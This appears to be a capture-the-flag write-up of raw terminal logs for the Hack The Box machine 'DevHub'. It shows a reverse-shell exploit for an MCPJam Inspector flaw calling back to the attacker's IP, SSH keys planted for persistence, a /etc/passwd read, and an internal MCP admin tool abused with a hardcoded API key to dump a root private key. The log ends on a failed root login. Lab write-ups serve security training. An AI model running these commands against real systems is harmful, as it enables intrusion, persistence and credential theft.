


![[Pasted image 20260804015636.png]]

```
nmap -sCV 10.129.3.147             
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-03 11:15 -0400
Nmap scan report for 10.129.3.147
Host is up (0.21s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

```
git clone https://github.com/thisisish/HTB-DevHub.git                                                 
Cloning into 'HTB-DevHub'...
remote: Enumerating objects: 22, done.
remote: Counting objects: 100% (22/22), done.
remote: Compressing objects: 100% (18/18), done.
remote: Total 22 (delta 4), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (22/22), 17.89 KiB | 345.00 KiB/s, done.
Resolving deltas: 100% (4/4), done.


```

```
(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# mv enum.py htb_enum.py
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# python3 exploit.py -t devhub.htb -l 10.10.14.60 -r 4444

  __  __  ____ ____      _                 ____  ____ _____
 |  \/  |/ ___|  _ \ ___| |_ __ _ _ __ __|  _ \/ ___| ____|
 | |\/| | |   | |_) / __| __/ _` | '__/ __| |_) \___ \  _|
 | |  | | |___|  __/\__ \ || (_| | | | (__  _ < ___) | |___
 |_|  |_|\____|_|   |___/\__\__,_|_|  \___|_| \_\____/_____|

  CVE-2026-23744  |  MCPJam Inspector Unauth RCE  |  CVSS 9.8
  Affects: @mcpjam/inspector <= 1.4.2

[*] Target          : http://devhub.htb:6274
[*] Callback        : 10.10.14.60:4444
────────────────────────────────────────────────────────────
[*] Probing target  : http://devhub.htb:6274/api/mcp/connect
[+] HTTP 400 — no auth enforced on endpoint
[+] Target appears VULNERABLE to CVE-2026-23744

[*] Shell command   : bash -i >& /dev/tcp/10.10.14.60/4444 0>&1
[*] Base64 encoded  : YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42MC80NDQ0IDA+JjE=

[*] Sending payload → http://devhub.htb:6274/api/mcp/connect
[!] Ensure nc -lvnp 4444 is running before proceeding

[+] ReadTimeout — this is expected behaviour when shell connects!
[+] Check your nc listener on port 4444

 
```

![[Pasted image 20260804014303.png]]

![[Pasted image 20260804014350.png]]

```
(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.3.147 - - [03/Aug/2026 11:56:42] "GET /htb_enum.py HTTP/1.1" 200 -
^C                                            
Keyboard interrupt received, exiting.

```

![[Pasted image 20260804014528.png]]

```
mcp-dev@devhub:/tmp$ wget http://10.10.14.60:8000/htb_enum.py
wget http://10.10.14.60:8000/htb_enum.py
--2026-08-02 16:00:17--  http://10.10.14.60:8000/htb_enum.py
Connecting to 10.10.14.60:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 28994 (28K) [text/x-python]
Saving to: ‘htb_enum.py’

htb_enum.py         100%[===================>]  28.31K   152KB/s    in 0.2s    

2026-08-02 16:00:18 (152 KB/s) - ‘htb_enum.py’ saved [28994/28994]

mcp-dev@devhub:/tmp$ python3 htb_enum.py --section all
python3 htb_enum.py --section all

 ██████╗ ███████╗██╗   ██╗██╗  ██╗██╗   ██╗██████╗                                                                                                           
 ██╔══██╗██╔════╝██║   ██║██║  ██║██║   ██║██╔══██╗                                                                                                          
 ██║  ██║█████╗  ██║   ██║███████║██║   ██║██████╔╝                                                                                                          
 ██║  ██║██╔══╝  ╚██╗ ██╔╝██╔══██║██║   ██║██╔══██╗                                                                                                          
 ██████╔╝███████╗ ╚████╔╝ ██║  ██║╚██████╔╝██████╔╝                                                                                                          
 ╚═════╝ ╚══════╝  ╚═══╝  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝                                                                                                           
  Local Enumeration — Python / Jupyter / MCP / Privesc                                                                                                       
  2026-08-02 16:00:27                                                                                                                                        
 

──────────────────────────────────────────────────────────── 
```


![[Pasted image 20260804014623.png]]

```
mcp-dev@devhub:/tmp$ /home/analyst/jupyter-env/bin/jupyter-lab \
  --ip=127.0.0.1 \
  --port=8888 \
  --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7> > > 
bash: /home/analyst/jupyter-env/bin/jupyter-lab: Permission denied
mcp-dev@devhub:/tmp$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
syslog:x:106:113::/home/syslog:/usr/sbin/nologin
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
tss:x:109:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:110:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:111:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mcp-dev:x:1001:1001::/home/mcp-dev:/bin/bash
analyst:x:1002:1002::/home/analyst:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false




```

![[Pasted image 20260804014835.png]]

```
mcp-dev@devhub:/tmp$ mkdir .ssh
mcp-dev@devhub:/tmp$ cd .ssh
mcp-dev@devhub:/tmp/.ssh$ cd ..
mcp-dev@devhub:/tmp$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQClHdxAedYTm0QYOncPZVmF7rZMesJSiXnOCgSULfpOS+2cNLg1OArXgWtJ8qbP/I7oRfV5baYUunkG8PrfcR7GC5eRc5w6UcsEAoBycgT5NLRdXooQ80MPkfYOGkO4IBSQdIDeXrvaklFxiMohoPtWS8NePPrEaQBxXu3V9NXV8H86nUNWpb/Es0lo59gZ8i8vXXz02h/lP3858V/Ch7fKaYIPpCeg6VDxHvWDojTvq4r2p3W9g1xZSXj0TqLasH5l5YL5lvq3bAyULNF2+QAji5D4Eu+EBcAlQuOUNtJp4cZy2Sx1Qv+8sIxBNySeYhFWX7+ew0UYxexJQUp+GBqIeBbIjEX+IcJM0x7BAftpBSWKSOg9rkwDEXtHhtBf19Ih8/WA3KSz40ICLq2frcQOVNJm+5R3GFud66rHZuyUJK2hvcIPFtjbLrurUtLUXmLPU6XXC79Hpz1F6BkbjGS7N+zixIfIJkegu8oc5vuxFzKbPWOJ+cSTyt374gVS4H6TTE9XIaOHEZrXnB4+9AAqriaRfJ5GXYTcupePnJutyjo21aCj4VG9AKNHCUHP9pWMzBdNZT0HEE9HWIhqln6p8uH9I2oMXyu19hxg1tPpbCI4XF8nKCNtyapTBvU5fo6TG2hcSNjGEH9eGmUbLippSItUCds26WmuV1SRTG/p4w== root@kali" > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keysbash: /home/mcp-dev/.ssh/authorized_keys: No such file or directory
mcp-dev@devhub:/tmp$ mkdir -p ~/.ssh && chmod 700 ~/.ssh
chmod: invalid option -- 'p'
Try 'chmod --help' for more information.
mcp-dev@devhub:/tmp$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQClHdxAedYTm0QYOncPZVmF7rZMesJSiXnOCgSULfpOS+2cNLg1OArXgWtJ8qbP/I7oRfV5baYUunkG8PrfcR7GC5eRc5w6UcsEAoBycgT5NLRdXooQ80MPkfYOGkO4IBSQdIDeXrvaklFxiMohoPtWS8NePPrEaQBxXu3V9NXV8H86nUNWpb/Es0lo59gZ8i8vXXz02h/lP3858V/Ch7fKaYIPpCeg6VDxHvWDojTvq4r2p3W9g1xZSXj0TqLasH5l5YL5lvq3bAyULNF2+QAji5D4Eu+EBcAlQuOUNtJp4cZy2Sx1Qv+8sIxBNySeYhFWX7+ew0UYxexJQUp+GBqIeBbIjEX+IcJM0x7BAftpBSWKSOg9rkwDEXtHhtBf19Ih8/WA3KSz40ICLq2frcQOVNJm+5R3GFud66rHZuyUJK2hvcIPFtjbLrurUtLUXmLPU6XXC79Hpz1F6BkbjGS7N+zixIfIJkegu8oc5vuxFzKbPWOJ+cSTyt374gVS4H6TTE9XIaOHEZrXnB4+9AAqriaRfJ5GXYTcupePnJutyjo21aCj4VG9AKNHCUHP9pWMzBdNZT0HEE9HWIhqln6p8uH9I2oMXyu19hxg1tPpbCI4XF8nKCNtyapTBvU5fo6TG2hcSNjGEH9eGmUbLippSItUCds26WmuV1SRTG/p4w== root@kali" > ~/.ssh/authorized_keys
bash: /home/mcp-dev/.ssh/authorized_keys: No such file or directory
mcp-dev@devhub:/tmp$ chmod 600 ~/.ssh/authorized_keys
chmod: cannot access '/home/mcp-dev/.ssh/authorized_keys': No such file or directory
mcp-dev@devhub:/tmp$ cd ../../../../home
mcp-dev@devhub:/home$ mkdir /home/mcp-dev/.ssh
mcp-dev@devhub:/home$ chmod 700 /home/mcp-dev/.ssh
mcp-dev@devhub:/home$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQClHdxAedYTm0QYOncPZVmF7rZMesJSiXnOCgSULfpOS+2cNLg1OArXgWtJ8qbP/I7oRfV5baYUunkG8PrfcR7GC5eRc5w6UcsEAoBycgT5NLRdXooQ80MPkfYOGkO4IBSQdIDeXrvaklFxiMohoPtWS8NePPrEaQBxXu3V9NXV8H86nUNWpb/Es0lo59gZ8i8vXXz02h/lP3858V/Ch7fKaYIPpCeg6VDxHvWDojTvq4r2p3W9g1xZSXj0TqLasH5l5YL5lvq3bAyULNF2+QAji5D4Eu+EBcAlQuOUNtJp4cZy2Sx1Qv+8sIxBNySeYhFWX7+ew0UYxexJQUp+GBqIeBbIjEX+IcJM0x7BAftpBSWKSOg9rkwDEXtHhtBf19Ih8/WA3KSz40ICLq2frcQOVNJm+5R3GFud66rHZuyUJK2hvcIPFtjbLrurUtLUXmLPU6XXC79Hpz1F6BkbjGS7N+zixIfIJkegu8oc5vuxFzKbPWOJ+cSTyt374gVS4H6TTE9XIaOHEZrXnB4+9AAqriaRfJ5GXYTcupePnJutyjo21aCj4VG9AKNHCUHP9pWMzBdNZT0HEE9HWIhqln6p8uH9I2oMXyu19hxg1tPpbCI4XF8nKCNtyapTBvU5fo6TG2hcSNjGEH9eGmUbLippSItUCds26WmuV1SRTG/p4w== root@kali" > /home/mcp-dev/.ssh/authorized_keys
mcp-dev@devhub:/home$ chmod 600 /home/mcp-dev/.ssh/authorized_keys


```


```
(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# cat ~/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQClHdxAedYTm0QYOncPZVmF7rZMesJSiXnOCgSULfpOS+2cNLg1OArXgWtJ8qbP/I7oRfV5baYUunkG8PrfcR7GC5eRc5w6UcsEAoBycgT5NLRdXooQ80MPkfYOGkO4IBSQdIDeXrvaklFxiMohoPtWS8NePPrEaQBxXu3V9NXV8H86nUNWpb/Es0lo59gZ8i8vXXz02h/lP3858V/Ch7fKaYIPpCeg6VDxHvWDojTvq4r2p3W9g1xZSXj0TqLasH5l5YL5lvq3bAyULNF2+QAji5D4Eu+EBcAlQuOUNtJp4cZy2Sx1Qv+8sIxBNySeYhFWX7+ew0UYxexJQUp+GBqIeBbIjEX+IcJM0x7BAftpBSWKSOg9rkwDEXtHhtBf19Ih8/WA3KSz40ICLq2frcQOVNJm+5R3GFud66rHZuyUJK2hvcIPFtjbLrurUtLUXmLPU6XXC79Hpz1F6BkbjGS7N+zixIfIJkegu8oc5vuxFzKbPWOJ+cSTyt374gVS4H6TTE9XIaOHEZrXnB4+9AAqriaRfJ5GXYTcupePnJutyjo21aCj4VG9AKNHCUHP9pWMzBdNZT0HEE9HWIhqln6p8uH9I2oMXyu19hxg1tPpbCI4XF8nKCNtyapTBvU5fo6TG2hcSNjGEH9eGmUbLippSItUCds26WmuV1SRTG/p4w== root@kali
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# mkdir -p ~/.ssh
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# chmod 700 ~/.ssh
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQClHdxAedYTm0QYOncPZVmF7rZMesJSiXnOCgSULfpOS+2cNLg1OArXgWtJ8qbP/I7oRfV5baYUunkG8PrfcR7GC5eRc5w6UcsEAoBycgT5NLRdXooQ80MPkfYOGkO4IBSQdIDeXrvaklFxiMohoPtWS8NePPrEaQBxXu3V9NXV8H86nUNWpb/Es0lo59gZ8i8vXXz02h/lP3858V/Ch7fKaYIPpCeg6VDxHvWDojTvq4r2p3W9g1xZSXj0TqLasH5l5YL5lvq3bAyULNF2+QAji5D4Eu+EBcAlQuOUNtJp4cZy2Sx1Qv+8sIxBNySeYhFWX7+ew0UYxexJQUp+GBqIeBbIjEX+IcJM0x7BAftpBSWKSOg9rkwDEXtHhtBf19Ih8/WA3KSz40ICLq2frcQOVNJm+5R3GFud66rHZuyUJK2hvcIPFtjbLrurUtLUXmLPU6XXC79Hpz1F6BkbjGS7N+zixIfIJkegu8oc5vuxFzKbPWOJ+cSTyt374gVS4H6TTE9XIaOHEZrXnB4+9AAqriaRfJ5GXYTcupePnJutyjo21aCj4VG9AKNHCUHP9pWMzBdNZT0HEE9HWIhqln6p8uH9I2oMXyu19hxg1tPpbCI4XF8nKCNtyapTBvU5fo6TG2hcSNjGEH9eGmUbLippSItUCds26WmuV1SRTG/p4w== root@kali" > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# ssh -L 8888:127.0.0.1:8888 mcp-dev@devhub.htb
The authenticity of host 'devhub.htb (10.129.3.147)' can't be established.
ED25519 key fingerprint is: SHA256:K64LcxfMoWF9TY77Q+quN1nvBzFftQ11ZxoH8eULpCs
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'devhub.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Aug  2 06:27:17 PM UTC 2026

  System load:           0.0
  Usage of /:            79.4% of 9.50GB
  Memory usage:          22%
  Swap usage:            0%
  Processes:             227
  Users logged in:       0
  IPv4 address for eth0: 10.129.3.147
  IPv6 address for eth0: dead:beef::250:56ff:fe95:a339

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sun Aug 2 18:27:18 2026 from 10.10.14.60
mcp-dev@devhub:~$ ls 
mcp-dev@devhub:~$ pwd
/home/mcp-dev
mcp-dev@devhub:~$ cd ../
mcp-dev@devhub:/home$ ls
analyst  mcp-dev
mcp-dev@devhub:/home$ cd mcp-dev
mcp-dev@devhub:~$ ls -la
total 36
drwxr-x--- 5 mcp-dev mcp-dev 4096 Aug  2 18:26 .
drwxr-xr-x 4 root    root    4096 Mar 16 21:25 ..
-rw------- 1 mcp-dev mcp-dev   69 Aug  2 15:50 .bash_history
-rw-r--r-- 1 mcp-dev mcp-dev  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 mcp-dev mcp-dev 3771 Jan  6  2022 .bashrc
drwx------ 2 mcp-dev mcp-dev 4096 May 26 08:42 .cache
lrwxrwxrwx 1 root    root       9 Jan 23  2026 .lesshst -> /dev/null
lrwxrwxrwx 1 root    root       9 Jan 23  2026 .node_repl_history -> /dev/null
drwxrwxr-x 4 mcp-dev mcp-dev 4096 Jan 22  2026 .npm
-rw-r--r-- 1 mcp-dev mcp-dev  807 Jan  6  2022 .profile
lrwxrwxrwx 1 root    root       9 Jan 23  2026 .python_history -> /dev/null
drwx------ 2 mcp-dev mcp-dev 4096 Aug  2 18:26 .ssh
lrwxrwxrwx 1 root    root       9 Jan 23  2026 .viminfo -> /dev/null
mcp-dev@devhub:~$ ps aux | grep jupyter
analyst     1076  0.0  2.4 182536 96376 ?        Ss   15:17   0:05 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
root        1082  0.0  0.7  37376 28828 ?        Ss   15:17   0:02 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
mcp-dev     2180  0.0  0.0   6480  2296 pts/1    S+   18:28   0:00 grep --color=auto jupyter
mcp-dev@devhub:~$ pwd
/home/mcp-dev
mcp-dev@devhub:~$ cd ../analyst 

```



![[Pasted image 20260804015203.png]]


![[Pasted image 20260804015315.png]]

```
analyst@devhub:~$ mkdir -p /home/analyst/.ssh && chmod 700 /home/analyst/.ssh
mkdir -p /home/analyst/.ssh && chmod 700 /home/analyst/.ssh
analyst@devhub:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQClHdxAedYTm0QYOncPZVmF7rZMesJSiXnOCgSULfpOS+2cNLg1OArXgWtJ8qbP/I7oRfV5baYUunkG8PrfcR7GC5eRc5w6UcsEAoBycgT5NLRdXooQ80MPkfYOGkO4IBSQdIDeXrvaklFxiMohoPtWS8NePPrEaQBxXu3V9NXV8H86nUNWpb/Es0lo59gZ8i8vXXz02h/lP3858V/Ch7fKaYIPpCeg6VDxHvWDojTvq4r2p3W9g1xZSXj0TqLasH5l5YL5lvq3bAyULNF2+QAji5D4Eu+EBcAlQuOUNtJp4cZy2Sx1Qv+8sIxBNySeYhFWX7+ew0UYxexJQUp+GBqIeBbIjEX+IcJM0x7BAftpBSWKSOg9rkwDEXtHhtBf19Ih8/WA3KSz40ICLq2frcQOVNJm+5R3GFud66rHZuyUJK2hvcIPFtjbLrurUtLUXmLPU6XXC79Hpz1F6BkbjGS7N+zixIfIJkegu8oc5vuxFzKbPWOJ+cSTyt374gVS4H6TTE9XIaOHEZrXnB4+9AAqriaRfJ5GXYTcupePnJutyjo21aCj4VG9AKNHCUHP9pWMzBdNZT0HEE9HWIhqln6p8uH9I2oMXyu19hxg1tPpbCI4XF8nKCNtyapTBvU5fo6TG2hcSNjGEH9eGmUbLippSItUCds26WmuV1SRTG/p4w== root@kali" > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keysecho "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQClHdxAedYTm0QYOncPZVmF7rZMesJSiXnOCgSULfpOS+2cNLg1OArXgWtJ8qbP/I7oRfV5baYUunkG8PrfcR7GC5eRc5w6UcsEAoBycgT5NLRdXooQ80MPkfYOGkO4IBSQdIDeXrvaklFxiMohoPtWS8NePPrEaQBxXu3V9NXV8H86nUNWpb/Es0lo59gZ8i8vXXz02h/lP3858V/Ch7fKaYIPpCeg6VDxHvWDojTvq4r2p3W9g1xZSXj0TqLasH5l5YL5lvq3bAyULNF2+QAji5D4Eu+EBcAlQuOUNtJp4cZy2Sx1Qv+8sIxBNySeYhFWX7+ew0UYxexJQUp+GBqIeBbIjEX+IcJM0x7BAftpBSWKSOg9rkwDEXtHhtBf19Ih8/WA3KSz40ICLq2frcQOVNJm+5R3GFud66rHZuyUJK2hvcIPFtjbLrurUtLUXmLPU6XXC79Hpz1F6BkbjGS7N+zixIfIJkegu8oc5vuxFzKbPWOJ+cSTyt374gVS4H6TTE9XIaOHEZrXnB4+9AAqriaRfJ5GXYTcupePnJutyjo21aCj4VG9AKNHCUHP9pWMzBdNZT0HEE9HWIhqln6p8uH9I2oMXyu19hxg1tPpbCI4XF8nKCNtyapTBvU5fo6TG2hcSNjGEH9eGmUbLippSItUCds26WmuV1SRTG/p4w== root@kali" > ~/.ssh/authorized_keys
analyst@devhub:~$ exit
chmod 600 ~/.ssh/authorized_keysexit
chmod: cannot access '/home/analyst/.ssh/authorized_keysexit': No such file or directory
analyst@devhub:~$ ^C


```

```
                                                                                                                                                          
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# cat ~/.ssh/id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQClHdxAedYTm0QYOncPZVmF7rZMesJSiXnOCgSULfpOS+2cNLg1OArXgWtJ8qbP/I7oRfV5baYUunkG8PrfcR7GC5eRc5w6UcsEAoBycgT5NLRdXooQ80MPkfYOGkO4IBSQdIDeXrvaklFxiMohoPtWS8NePPrEaQBxXu3V9NXV8H86nUNWpb/Es0lo59gZ8i8vXXz02h/lP3858V/Ch7fKaYIPpCeg6VDxHvWDojTvq4r2p3W9g1xZSXj0TqLasH5l5YL5lvq3bAyULNF2+QAji5D4Eu+EBcAlQuOUNtJp4cZy2Sx1Qv+8sIxBNySeYhFWX7+ew0UYxexJQUp+GBqIeBbIjEX+IcJM0x7BAftpBSWKSOg9rkwDEXtHhtBf19Ih8/WA3KSz40ICLq2frcQOVNJm+5R3GFud66rHZuyUJK2hvcIPFtjbLrurUtLUXmLPU6XXC79Hpz1F6BkbjGS7N+zixIfIJkegu8oc5vuxFzKbPWOJ+cSTyt374gVS4H6TTE9XIaOHEZrXnB4+9AAqriaRfJ5GXYTcupePnJutyjo21aCj4VG9AKNHCUHP9pWMzBdNZT0HEE9HWIhqln6p8uH9I2oMXyu19hxg1tPpbCI4XF8nKCNtyapTBvU5fo6TG2hcSNjGEH9eGmUbLippSItUCds26WmuV1SRTG/p4w== root@kali
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# python3 apiInteract.py
python3: can't open file '/home/kali/Desktop/HTB/HTB-DevHub/apiInteract.py': [Errno 2] No such file or directory
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# cat > /tmp/apiInteract.py <<'EOF'
import requests

url = "http://localhost:5000/tools/call"

def request():
    try:
        headers = {
            "X-API-Key": "opsmcp_secret_key_4f5a6b7c8d9e0f1a",
        }
        payload = {
            "name": "ops._admin_dump",
            "arguments": {"target": "ssh_keys", "confirm": True}
        }
        r = requests.post(url, headers=headers, json=payload)
        print(r.text)
        return 0
    except Exception as e:
        print(f"Failed to send the request: {e}")

if __name__=="__main__":
    request()
EOF
python3 /tmp/apiInteract.py
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}

                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# jq -r '.root_private_key' /tmp/root_key.json > /tmp/root_key
jq: error: Could not open file /tmp/root_key.json: No such file or directory
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# ssh -i /tmp/root_key -o StrictHostKeyChecking=no root@10.129.3.147
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 for '/tmp/root_key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "/tmp/root_key": bad permissions
root@10.129.3.147's password: 

                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# chmod 600 /tmp/root_key
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# ssh -i /tmp/root_key -o StrictHostKeyChecking=no root@10.129.3.147
Load key "/tmp/root_key": error in libcrypto
